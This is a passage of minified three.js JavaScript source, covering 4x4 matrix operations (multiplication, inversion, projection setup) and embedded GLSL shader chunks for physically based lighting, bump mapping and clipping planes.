c=a.elements,d=b.elements,e=this.elements,f=c[0],g=c[4],h=c[8],m=c[12],k=c[1],l=c[5],p=c[9],n=c[13],u=c[2],q=c[6],r=c[10],A=c[14],w=c[3],y=c[7],K=c[11],c=c[15],v=d[0],E=d[4],L=d[8],C=d[12],F=d[1],x=d[5],H=d[9],D=d[13],z=d[2],J=d[6],\nI=d[10],Q=d[14],M=d[3],O=d[7],P=d[11],d=d[15];e[0]=f*v+g*F+h*z+m*M;e[4]=f*E+g*x+h*J+m*O;e[8]=f*L+g*H+h*I+m*P;e[12]=f*C+g*D+h*Q+m*d;e[1]=k*v+l*F+p*z+n*M;e[5]=k*E+l*x+p*J+n*O;e[9]=k*L+l*H+p*I+n*P;e[13]=k*C+l*D+p*Q+n*d;e[2]=u*v+q*F+r*z+A*M;e[6]=u*E+q*x+r*J+A*O;e[10]=u*L+q*H+r*I+A*P;e[14]=u*C+q*D+r*Q+A*d;e[3]=w*v+y*F+K*z+c*M;e[7]=w*E+y*x+K*J+c*O;e[11]=w*L+y*H+K*I+c*P;e[15]=w*C+y*D+K*Q+c*d;return this},multiplyToArray:function(a,b,c){var d=this.elements;this.multiplyMatrices(a,b);c[0]=d[0];c[1]=d[1];c[2]=\nd[2];c[3]=d[3];c[4]=d[4];c[5]=d[5];c[6]=d[6];c[7]=d[7];c[8]=d[8];c[9]=d[9];c[10]=d[10];c[11]=d[11];c[12]=d[12];c[13]=d[13];c[14]=d[14];c[15]=d[15];return this},multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[4]*=a;b[8]*=a;b[12]*=a;b[1]*=a;b[5]*=a;b[9]*=a;b[13]*=a;b[2]*=a;b[6]*=a;b[10]*=a;b[14]*=a;b[3]*=a;b[7]*=a;b[11]*=a;b[15]*=a;return this},applyToBufferAttribute:function(){var a;return function(b){void 0===a&&(a=new q);for(var c=0,d=b.count;c<d;c++)a.x=b.getX(c),a.y=b.getY(c),a.z=b.getZ(c),\na.applyMatrix4(this),b.setXYZ(c,a.x,a.y,a.z);return b}}(),determinant:function(){var a=this.elements,b=a[0],c=a[4],d=a[8],e=a[12],f=a[1],g=a[5],h=a[9],m=a[13],k=a[2],l=a[6],p=a[10],n=a[14];return a[3]*(+e*h*l-d*m*l-e*g*p+c*m*p+d*g*n-c*h*n)+a[7]*(+b*h*n-b*m*p+e*f*p-d*f*n+d*m*k-e*h*k)+a[11]*(+b*m*l-b*g*n-e*f*l+c*f*n+e*g*k-c*m*k)+a[15]*(-d*g*k-b*h*l+b*g*p+d*f*l-c*f*p+c*h*k)},transpose:function(){var a=this.elements,b;b=a[1];a[1]=a[4];a[4]=b;b=a[2];a[2]=a[8];a[8]=b;b=a[6];a[6]=a[9];a[9]=b;b=a[3];a[3]=\na[12];a[12]=b;b=a[7];a[7]=a[13];a[13]=b;b=a[11];a[11]=a[14];a[14]=b;return this},setPosition:function(a){var b=this.elements;b[12]=a.x;b[13]=a.y;b[14]=a.z;return this},getInverse:function(a,b){var c=this.elements,d=a.elements,e=d[0],f=d[1],g=d[2],h=d[3],m=d[4],k=d[5],l=d[6],p=d[7],n=d[8],u=d[9],q=d[10],r=d[11],A=d[12],w=d[13],y=d[14],d=d[15],K=u*y*p-w*q*p+w*l*r-k*y*r-u*l*d+k*q*d,v=A*q*p-n*y*p-A*l*r+m*y*r+n*l*d-m*q*d,E=n*w*p-A*u*p+A*k*r-m*w*r-n*k*d+m*u*d,L=A*u*l-n*w*l-A*k*q+m*w*q+n*k*y-m*u*y,C=e*K+\nf*v+g*E+h*L;if(0===C){if(!0===b)throw Error(\"THREE.Matrix4.getInverse(): can't invert matrix, determinant is 0\");console.warn(\"THREE.Matrix4.getInverse(): can't invert matrix, determinant is 0\");return this.identity()}C=1/C;c[0]=K*C;c[1]=(w*q*h-u*y*h-w*g*r+f*y*r+u*g*d-f*q*d)*C;c[2]=(k*y*h-w*l*h+w*g*p-f*y*p-k*g*d+f*l*d)*C;c[3]=(u*l*h-k*q*h-u*g*p+f*q*p+k*g*r-f*l*r)*C;c[4]=v*C;c[5]=(n*y*h-A*q*h+A*g*r-e*y*r-n*g*d+e*q*d)*C;c[6]=(A*l*h-m*y*h-A*g*p+e*y*p+m*g*d-e*l*d)*C;c[7]=(m*q*h-n*l*h+n*g*p-e*q*p-m*g*\nr+e*l*r)*C;c[8]=E*C;c[9]=(A*u*h-n*w*h-A*f*r+e*w*r+n*f*d-e*u*d)*C;c[10]=(m*w*h-A*k*h+A*f*p-e*w*p-m*f*d+e*k*d)*C;c[11]=(n*k*h-m*u*h-n*f*p+e*u*p+m*f*r-e*k*r)*C;c[12]=L*C;c[13]=(n*w*g-A*u*g+A*f*q-e*w*q-n*f*y+e*u*y)*C;c[14]=(A*k*g-m*w*g-A*f*l+e*w*l+m*f*y-e*k*y)*C;c[15]=(m*u*g-n*k*g+n*f*l-e*u*l-m*f*q+e*k*q)*C;return this},scale:function(a){var b=this.elements,c=a.x,d=a.y;a=a.z;b[0]*=c;b[4]*=d;b[8]*=a;b[1]*=c;b[5]*=d;b[9]*=a;b[2]*=c;b[6]*=d;b[10]*=a;b[3]*=c;b[7]*=d;b[11]*=a;return this},getMaxScaleOnAxis:function(){var a=\nthis.elements;return Math.sqrt(Math.max(a[0]*a[0]+a[1]*a[1]+a[2]*a[2],a[4]*a[4]+a[5]*a[5]+a[6]*a[6],a[8]*a[8]+a[9]*a[9]+a[10]*a[10]))},makeTranslation:function(a,b,c){this.set(1,0,0,a,0,1,0,b,0,0,1,c,0,0,0,1);return this},makeRotationX:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(1,0,0,0,0,b,-a,0,0,a,b,0,0,0,0,1);return this},makeRotationY:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(b,0,a,0,0,1,0,0,-a,0,b,0,0,0,0,1);return this},makeRotationZ:function(a){var b=Math.cos(a);a=Math.sin(a);\nthis.set(b,-a,0,0,a,b,0,0,0,0,1,0,0,0,0,1);return this},makeRotationAxis:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=1-c,f=a.x,g=a.y,h=a.z,m=e*f,k=e*g;this.set(m*f+c,m*g-d*h,m*h+d*g,0,m*g+d*h,k*g+c,k*h-d*f,0,m*h-d*g,k*h+d*f,e*h*h+c,0,0,0,0,1);return this},makeScale:function(a,b,c){this.set(a,0,0,0,0,b,0,0,0,0,c,0,0,0,0,1);return this},makeShear:function(a,b,c){this.set(1,b,c,0,a,1,c,0,a,b,1,0,0,0,0,1);return this},compose:function(a,b,c){this.makeRotationFromQuaternion(b);this.scale(c);this.setPosition(a);\nreturn this},decompose:function(){var a,b;return function(c,d,e){void 0===a&&(a=new q,b=new S);var f=this.elements,g=a.set(f[0],f[1],f[2]).length(),h=a.set(f[4],f[5],f[6]).length(),m=a.set(f[8],f[9],f[10]).length();0>this.determinant()&&(g=-g);c.x=f[12];c.y=f[13];c.z=f[14];b.elements.set(this.elements);c=1/g;var f=1/h,k=1/m;b.elements[0]*=c;b.elements[1]*=c;b.elements[2]*=c;b.elements[4]*=f;b.elements[5]*=f;b.elements[6]*=f;b.elements[8]*=k;b.elements[9]*=k;b.elements[10]*=k;d.setFromRotationMatrix(b);\ne.x=g;e.y=h;e.z=m;return this}}(),makePerspective:function(a,b,c,d,e,f){void 0===f&&console.warn(\"THREE.Matrix4: .makePerspective() has been redefined and has a new signature. Please check the docs.\");var g=this.elements;g[0]=2*e/(b-a);g[4]=0;g[8]=(b+a)/(b-a);g[12]=0;g[1]=0;g[5]=2*e/(c-d);g[9]=(c+d)/(c-d);g[13]=0;g[2]=0;g[6]=0;g[10]=-(f+e)/(f-e);g[14]=-2*f*e/(f-e);g[3]=0;g[7]=0;g[11]=-1;g[15]=0;return this},makeOrthographic:function(a,b,c,d,e,f){var g=this.elements,h=1/(b-a),m=1/(c-d),k=1/(f-e);g[0]=\n2*h;g[4]=0;g[8]=0;g[12]=-((b+a)*h);g[1]=0;g[5]=2*m;g[9]=0;g[13]=-((c+d)*m);g[2]=0;g[6]=0;g[10]=-2*k;g[14]=-((f+e)*k);g[3]=0;g[7]=0;g[11]=0;g[15]=1;return this},equals:function(a){var b=this.elements;a=a.elements;for(var c=0;16>c;c++)if(b[c]!==a[c])return!1;return!0},fromArray:function(a,b){void 0===b&&(b=0);for(var c=0;16>c;c++)this.elements[c]=a[c+b];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];\na[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];a[b+9]=c[9];a[b+10]=c[10];a[b+11]=c[11];a[b+12]=c[12];a[b+13]=c[13];a[b+14]=c[14];a[b+15]=c[15];return a}};Za.prototype=Object.create(ea.prototype);Za.prototype.constructor=Za;Za.prototype.isCubeTexture=!0;Object.defineProperty(Za.prototype,\"images\",{get:function(){return this.image},set:function(a){this.image=a}});var Ee=new ea,Fe=new Za,Be=[],De=[];Je.prototype.setValue=function(a,b){for(var c=this.seq,d=0,e=c.length;d!==e;++d){var f=c[d];f.setValue(a,\nb[f.id])}};var Rd=/([\\w\\d_]+)(\\])?(\\[|\\.)?/g;$a.prototype.setValue=function(a,b,c){b=this.map[b];void 0!==b&&b.setValue(a,c,this.renderer)};$a.prototype.set=function(a,b,c){var d=this.map[c];void 0!==d&&d.setValue(a,b[c],this.renderer)};$a.prototype.setOptional=function(a,b,c){b=b[c];void 0!==b&&this.setValue(a,c,b)};$a.upload=function(a,b,c,d){for(var e=0,f=b.length;e!==f;++e){var g=b[e],h=c[g.id];!1!==h.needsUpdate&&g.setValue(a,h.value,d)}};$a.seqWithValue=function(a,b){for(var c=[],d=0,e=a.length;d!==\ne;++d){var f=a[d];f.id in b&&c.push(f)}return c};var Ja={merge:function(a){for(var b={},c=0;c<a.length;c++){var d=this.clone(a[c]),e;for(e in d)b[e]=d[e]}return b},clone:function(a){var b={},c;for(c in a){b[c]={};for(var d in a[c]){var e=a[c][d];e&&(e.isColor||e.isMatrix3||e.isMatrix4||e.isVector2||e.isVector3||e.isVector4||e.isTexture)?b[c][d]=e.clone():Array.isArray(e)?b[c][d]=e.slice():b[c][d]=e}}return b}},Z={alphamap_fragment:\"#ifdef USE_ALPHAMAP\\n\\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\\n#endif\\n\",\nalphamap_pars_fragment:\"#ifdef USE_ALPHAMAP\\n\\tuniform sampler2D alphaMap;\\n#endif\\n\",alphatest_fragment:\"#ifdef ALPHATEST\\n\\tif ( diffuseColor.a < ALPHATEST ) discard;\\n#endif\\n\",aomap_fragment:\"#ifdef USE_AOMAP\\n\\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\\n\\treflectedLight.indirectDiffuse *= ambientOcclusion;\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\t\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\t\\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\\n\\t#endif\\n#endif\\n\",\naomap_pars_fragment:\"#ifdef USE_AOMAP\\n\\tuniform sampler2D aoMap;\\n\\tuniform float aoMapIntensity;\\n#endif\",begin_vertex:\"\\nvec3 transformed = vec3( position );\\n\",beginnormal_vertex:\"\\nvec3 objectNormal = vec3( normal );\\n\",bsdfs:\"float punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\\n\\t\\tif( decayExponent > 0.0 ) {\\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\\n\\t\\t\\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\\n\\t\\t\\tfloat maxDistanceCutoffFactor = pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\\n\\t\\t\\treturn distanceFalloff * maxDistanceCutoffFactor;\\n#else\\n\\t\\t\\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\\n#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n}\\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\\n\\treturn RECIPROCAL_PI * diffuseColor;\\n}\\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\\n\\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\\n\\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\\n}\\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\treturn 1.0 / ( gl * gv );\\n}\\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\treturn 0.5 / max( gv + gl, EPSILON );\\n}\\nfloat D_GGX( const in float alpha, const in float dotNH ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\\n\\treturn RECIPROCAL_PI * a2 / pow2( denom );\\n}\\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat alpha = pow2( roughness );\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNL = saturate( dot( geometry.normal, incidentLight.direction ) );\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\\n\\tfloat D = D_GGX( alpha, dotNH );\\n\\treturn F * ( G * D );\\n}\\nvec2 ltcTextureCoords( const in GeometricContext geometry, const in float roughness ) {\\n\\tconst float LUT_SIZE  = 64.0;\\n\\tconst float LUT_SCALE = (LUT_SIZE - 1.0)/LUT_SIZE;\\n\\tconst float LUT_BIAS  = 0.5/LUT_SIZE;\\n\\tvec3 N = geometry.normal;\\n\\tvec3 V = geometry.viewDir;\\n\\tvec3 P = geometry.position;\\n\\tfloat theta = acos( dot( N, V ) );\\n\\tvec2 uv = vec2(\\n\\t\\tsqrt( saturate( roughness ) ),\\n\\t\\tsaturate( theta / ( 0.5 * PI ) ) );\\n\\tuv = uv * LUT_SCALE + LUT_BIAS;\\n\\treturn uv;\\n}\\nvoid clipQuadToHorizon( inout vec3 L[5], out int n ) {\\n\\tint config = 0;\\n\\tif ( L[0].z > 0.0 ) config += 1;\\n\\tif ( L[1].z > 0.0 ) config += 2;\\n\\tif ( L[2].z > 0.0 ) config += 4;\\n\\tif ( L[3].z > 0.0 ) config += 8;\\n\\tn = 0;\\n\\tif ( config == 0 ) {\\n\\t} else if ( config == 1 ) {\\n\\t\\tn = 3;\\n\\t\\tL[1] = -L[1].z * L[0] + L[0].z * L[1];\\n\\t\\tL[2] = -L[3].z * L[0] + L[0].z * L[3];\\n\\t} else if ( config == 2 ) {\\n\\t\\tn = 3;\\n\\t\\tL[0] = -L[0].z * L[1] + L[1].z * L[0];\\n\\t\\tL[2] = -L[2].z * L[1] + L[1].z * L[2];\\n\\t} else if ( config == 3 ) {\\n\\t\\tn = 4;\\n\\t\\tL[2] = -L[2].z * L[1] + L[1].z * L[2];\\n\\t\\tL[3] = -L[3].z * L[0] + L[0].z * L[3];\\n\\t} else if ( config == 4 ) {\\n\\t\\tn = 3;\\n\\t\\tL[0] = -L[3].z * L[2] + L[2].z * L[3];\\n\\t\\tL[1] = -L[1].z * L[2] + L[2].z * L[1];\\n\\t} else if ( config == 5 ) {\\n\\t\\tn = 0;\\n\\t} else if ( config == 6 ) {\\n\\t\\tn = 4;\\n\\t\\tL[0] = -L[0].z * L[1] + L[1].z * L[0];\\n\\t\\tL[3] = -L[3].z * L[2] + L[2].z * L[3];\\n\\t} else if ( config == 7 ) {\\n\\t\\tn = 5;\\n\\t\\tL[4] = -L[3].z * L[0] + L[0].z * L[3];\\n\\t\\tL[3] = -L[3].z * L[2] + L[2].z * L[3];\\n\\t} else if ( config == 8 ) {\\n\\t\\tn = 3;\\n\\t\\tL[0] = -L[0].z * L[3] + L[3].z * L[0];\\n\\t\\tL[1] = -L[2].z * L[3] + L[3].z * L[2];\\n\\t\\tL[2] =  L[3];\\n\\t} else if ( config == 9 ) {\\n\\t\\tn = 4;\\n\\t\\tL[1] = -L[1].z * L[0] + L[0].z * L[1];\\n\\t\\tL[2] = -L[2].z * L[3] + L[3].z * L[2];\\n\\t} else if ( config == 10 ) {\\n\\t\\tn = 0;\\n\\t} else if ( config == 11 ) {\\n\\t\\tn = 5;\\n\\t\\tL[4] = L[3];\\n\\t\\tL[3] = -L[2].z * L[3] + L[3].z * L[2];\\n\\t\\tL[2] = -L[2].z * L[1] + L[1].z * L[2];\\n\\t} else if ( config == 12 ) {\\n\\t\\tn = 4;\\n\\t\\tL[1] = -L[1].z * L[2] + L[2].z * L[1];\\n\\t\\tL[0] = -L[0].z * L[3] + L[3].z * L[0];\\n\\t} else if ( config == 13 ) {\\n\\t\\tn = 5;\\n\\t\\tL[4] = L[3];\\n\\t\\tL[3] = L[2];\\n\\t\\tL[2] = -L[1].z * L[2] + L[2].z * L[1];\\n\\t\\tL[1] = -L[1].z * L[0] + L[0].z * L[1];\\n\\t} else if ( config == 14 ) {\\n\\t\\tn = 5;\\n\\t\\tL[4] = -L[0].z * L[3] + L[3].z * L[0];\\n\\t\\tL[0] = -L[0].z * L[1] + L[1].z * L[0];\\n\\t} else if ( config == 15 ) {\\n\\t\\tn = 4;\\n\\t}\\n\\tif ( n == 3 )\\n\\t\\tL[3] = L[0];\\n\\tif ( n == 4 )\\n\\t\\tL[4] = L[0];\\n}\\nfloat integrateLtcBrdfOverRectEdge( vec3 v1, vec3 v2 ) {\\n\\tfloat cosTheta = dot( v1, v2 );\\n\\tfloat theta = acos( cosTheta );\\n\\tfloat res = cross( v1, v2 ).z * ( ( theta > 0.001 ) ? theta / sin( theta ) : 1.0 );\\n\\treturn res;\\n}\\nvoid initRectPoints( const in vec3 pos, const in vec3 halfWidth, const in vec3 halfHeight, out vec3 rectPoints[4] ) {\\n\\trectPoints[0] = pos - halfWidth - halfHeight;\\n\\trectPoints[1] = pos + halfWidth - halfHeight;\\n\\trectPoints[2] = pos + halfWidth + halfHeight;\\n\\trectPoints[3] = pos - halfWidth + halfHeight;\\n}\\nvec3 integrateLtcBrdfOverRect( const in GeometricContext geometry, const in mat3 brdfMat, const in vec3 rectPoints[4] ) {\\n\\tvec3 N = geometry.normal;\\n\\tvec3 V = geometry.viewDir;\\n\\tvec3 P = geometry.position;\\n\\tvec3 T1, T2;\\n\\tT1 = normalize(V - N * dot( V, N ));\\n\\tT2 = - cross( N, T1 );\\n\\tmat3 brdfWrtSurface = brdfMat * transpose( mat3( T1, T2, N ) );\\n\\tvec3 clippedRect[5];\\n\\tclippedRect[0] = brdfWrtSurface * ( rectPoints[0] - P );\\n\\tclippedRect[1] = brdfWrtSurface * ( rectPoints[1] - P );\\n\\tclippedRect[2] = brdfWrtSurface * ( rectPoints[2] - P );\\n\\tclippedRect[3] = brdfWrtSurface * ( rectPoints[3] - P );\\n\\tint n;\\n\\tclipQuadToHorizon(clippedRect, n);\\n\\tif ( n == 0 )\\n\\t\\treturn vec3( 0, 0, 0 );\\n\\tclippedRect[0] = normalize( clippedRect[0] );\\n\\tclippedRect[1] = normalize( clippedRect[1] );\\n\\tclippedRect[2] = normalize( clippedRect[2] );\\n\\tclippedRect[3] = normalize( clippedRect[3] );\\n\\tclippedRect[4] = normalize( clippedRect[4] );\\n\\tfloat sum = 0.0;\\n\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[0], clippedRect[1] );\\n\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[1], clippedRect[2] );\\n\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[2], clippedRect[3] );\\n\\tif (n >= 4)\\n\\t\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[3], clippedRect[4] );\\n\\tif (n == 5)\\n\\t\\tsum += integrateLtcBrdfOverRectEdge( clippedRect[4], clippedRect[0] );\\n\\tsum = max( 0.0, sum );\\n\\tvec3 Lo_i = vec3( sum, sum, sum );\\n\\treturn Lo_i;\\n}\\nvec3 Rect_Area_Light_Specular_Reflectance(\\n\\t\\tconst in GeometricContext geometry,\\n\\t\\tconst in vec3 lightPos, const in vec3 lightHalfWidth, const in vec3 lightHalfHeight,\\n\\t\\tconst in float roughness,\\n\\t\\tconst in sampler2D ltcMat, const in sampler2D ltcMag ) {\\n\\tvec3 rectPoints[4];\\n\\tinitRectPoints( lightPos, lightHalfWidth, lightHalfHeight, rectPoints );\\n\\tvec2 uv = ltcTextureCoords( geometry, roughness );\\n\\tvec4 brdfLtcApproxParams, t;\\n\\tbrdfLtcApproxParams = texture2D( ltcMat, uv );\\n\\tt = texture2D( ltcMat, uv );\\n\\tfloat brdfLtcScalar = texture2D( ltcMag, uv ).a;\\n\\tmat3 brdfLtcApproxMat = mat3(\\n\\t\\tvec3(   1,   0, t.y ),\\n\\t\\tvec3(   0, t.z,   0 ),\\n\\t\\tvec3( t.w,   0, t.x )\\n\\t);\\n\\tvec3 specularReflectance = integrateLtcBrdfOverRect( geometry, brdfLtcApproxMat, rectPoints );\\n\\tspecularReflectance *= brdfLtcScalar;\\n\\treturn specularReflectance;\\n}\\nvec3 Rect_Area_Light_Diffuse_Reflectance(\\n\\t\\tconst in GeometricContext geometry,\\n\\t\\tconst in vec3 lightPos, const in vec3 lightHalfWidth, const in vec3 lightHalfHeight ) {\\n\\tvec3 rectPoints[4];\\n\\tinitRectPoints( lightPos, lightHalfWidth, lightHalfHeight, rectPoints );\\n\\tmat3 diffuseBrdfMat = mat3(1);\\n\\tvec3 diffuseReflectance = integrateLtcBrdfOverRect( geometry, diffuseBrdfMat, rectPoints );\\n\\treturn diffuseReflectance;\\n}\\nvec3 BRDF_Specular_GGX_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\\n\\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\\n\\tvec4 r = roughness * c0 + c1;\\n\\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\\n\\tvec2 AB = vec2( -1.04, 1.04 ) * a004 + r.zw;\\n\\treturn specularColor * AB.x + AB.y;\\n}\\nfloat G_BlinnPhong_Implicit( ) {\\n\\treturn 0.25;\\n}\\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\\n\\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\\n}\\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_BlinnPhong_Implicit( );\\n\\tfloat D = D_BlinnPhong( shininess, dotNH );\\n\\treturn F * ( G * D );\\n}\\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\\n\\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\\n}\\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\\n\\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\\n}\\n\",\nbumpmap_pars_fragment:\"#ifdef USE_BUMPMAP\\n\\tuniform sampler2D bumpMap;\\n\\tuniform float bumpScale;\\n\\tvec2 dHdxy_fwd() {\\n\\t\\tvec2 dSTdx = dFdx( vUv );\\n\\t\\tvec2 dSTdy = dFdy( vUv );\\n\\t\\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\\n\\t\\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\\n\\t\\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\\n\\t\\treturn vec2( dBx, dBy );\\n\\t}\\n\\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\\n\\t\\tvec3 vSigmaX = dFdx( surf_pos );\\n\\t\\tvec3 vSigmaY = dFdy( surf_pos );\\n\\t\\tvec3 vN = surf_norm;\\n\\t\\tvec3 R1 = cross( vSigmaY, vN );\\n\\t\\tvec3 R2 = cross( vN, vSigmaX );\\n\\t\\tfloat fDet = dot( vSigmaX, R1 );\\n\\t\\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\\n\\t\\treturn normalize( abs( fDet ) * surf_norm - vGrad );\\n\\t}\\n#endif\\n\",\nclipping_planes_fragment:\"#if NUM_CLIPPING_PLANES > 0\\n\\tfor ( int i = 0; i < UNION_CLIPPING_PLANES; ++ i ) {\\n\\t\\tvec4 plane = clippingPlanes[ i ];\\n\\t\\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\\n\\t}\\n\\t\\t\\n\\t#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES\\n\\t\\tbool clipped = true;\\n\\t\\tfor ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; ++ i ) {\\n\\t\\t\\tvec4 plane = clippingPlanes[ i ];\\n\\t\\t\\tclipped = ( dot( vViewPosition, plane.xyz ) > plane.w ) && clipped;\\n\\t\\t}\\n\\t\\tif ( clipped ) discard;\\n\\t\\n\\t#endif\\n#endif\\n\",\nclipping_planes_pars_fragment:\"#if NUM_CLIPPING_PLANES > 0\\n\\t#if ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\t\\tvarying vec3 vViewPosition;\\n\\t#endif\\n\\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\\n#endif\\n\",clipping_planes_pars_vertex:\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n\",clipping_planes_vertex:\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n\",\ncolor_fragment:\"#ifdef USE_COLOR\\n\\tdiffuseColor.rgb *= vColor;\\n#endif\",color_pars_fragment:\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\\n\",color_pars_vertex:\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\",color_vertex:\"#ifdef USE_COLOR\\n\\tvColor.xyz = color.xyz;\\n#endif\",common:\"#define PI 3.14159265359\\n#define PI2 6.28318530718\\n#define PI_HALF 1.5707963267949\\n#define RECIPROCAL_PI 0.31830988618\\n#define RECIPROCAL_PI2 0.15915494\\n#define LOG2 1.442695\\n#define EPSILON 1e-6\\n#define saturate(a) clamp( a, 0.0, 1.0 )\\n#define whiteCompliment(a) ( 1.0 - saturate( a ) )\\nfloat pow2( const in float x ) { return x*x; }\\nfloat pow3( const in float x ) { return x*x*x; }\\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\\nhighp float rand( const in vec2 uv ) {\\n\\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\\n\\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\\n\\treturn fract(sin(sn) * c);\\n}\\nstruct IncidentLight {\\n\\tvec3 color;\\n\\tvec3 direction;\\n\\tbool visible;\\n};\\nstruct ReflectedLight {\\n\\tvec3 directDiffuse;\\n\\tvec3 directSpecular;\\n\\tvec3 indirectDiffuse;\\n\\tvec3 indirectSpecular;\\n};\\nstruct GeometricContext {\\n\\tvec3 position;\\n\\tvec3 normal;\\n\\tvec3 viewDir;\\n};\\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\\n}\\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\\n}\\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\tfloat distance = dot( planeNormal, point - pointOnPlane );\\n\\treturn - distance * planeNormal + point;\\n}\\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn sign( dot( point - pointOnPlane, planeNormal ) );\\n}\\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\\n}\\nmat3 transpose( const in mat3 